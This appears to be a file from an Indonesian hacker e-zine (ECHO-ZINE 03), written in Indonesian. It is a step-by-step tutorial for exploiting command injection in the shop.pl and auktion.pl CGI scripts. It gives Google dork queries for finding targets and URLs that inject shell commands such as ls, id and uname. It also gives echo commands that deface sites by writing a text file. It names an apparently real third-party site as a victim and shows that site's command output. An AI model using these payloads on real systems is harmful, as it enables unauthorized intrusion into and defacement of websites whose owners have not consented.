@@ -1,0 +1,64 @@
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       03
+
+Author: kamesywara
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+== BUGS pada shop.pl && auktion.pl  ==
+
+
+1. Shop.pl Bug
+   Bug ini seperti pada cpanel, and go bug. Lanjut ajah udah pernah koq!!
+   a. cari target di seach engine google sementara belum ada yang mengalahkan 
+      xixixi :=)
+      allinurl:shop.pl/page=
+      Nah tu kan ada nggak?? Klo ada langsung aja sikat  
+   b. Tambahkan di web brosermu sebagai berikut :
+      http://HOST/CGI_DIRECTORY/shop.pl/page=|ls|
+      Jika hal in menunjukan list directory maka itu adalah sasaran.
+   c. Deface kok terus, jangan dilakukan in hanya sebagai pengetahuan klean aja:
+      http://HOST/CGI_DIRECTORY/shop.pl/page=|echo j***cuk by Satria>file.txt|
+
+Note : file.txt adalah file deface dalam bentuk txt
+
+2. Auktion.pl Bug
+   Langkah-langkah :
+   a. Lelah aku nulisnya sama dengan atas cari di google 
+      allinurl:auktion.pl?menue=
+      Klo ketemu target lanjut
+   b. Coba sekarang tambahkan ini
+      http://[VICTIM]/cgi-bin/auktion.pl?menue=|ID|
+      Klo tag in menunjukkan hal aneh (apanya liat aja ndiri), maka lanjutkan 
+      ke langkah berikutnya
+      Jika hal ini tidak mengubah tampilan maka ya cari target lain.
+   c. Deface !!
+      Dengan perintah echo yang sangat populer dan lawas sekali (xixixi) 
+      http://[VICTIM]/cgi-bin/auktion.pl?menue=|echo Defaced by Satria>file.txt|
+Contoh :
+http://www.1000steine.de/cgi-bin/auktion.pl?menue=;id|
+uid=112(100steineftp) gid=100(users) groups=100(users),111(site-adm),113(site2)
+nah tu kan. 
+Lanjut
+http://www.1000steine.de/cgi-bin/auktion.pl?menue=;uname%20-a|
+Linux lagoon1.ipberlin.com 2.2.16C28_III #1 Mon Jul 30 22:07:58 PDT 2001 i586 unknown
+
+Thank`s buat  Kamesywara yang telah memberi ijin buat saya ambil nih artikelnya.
+dan all my friends yang nggak bisa saya sebutkan.
+peace indonesiaku
+Viva IT Indonesia
+
+
+ 
+
+
+ 
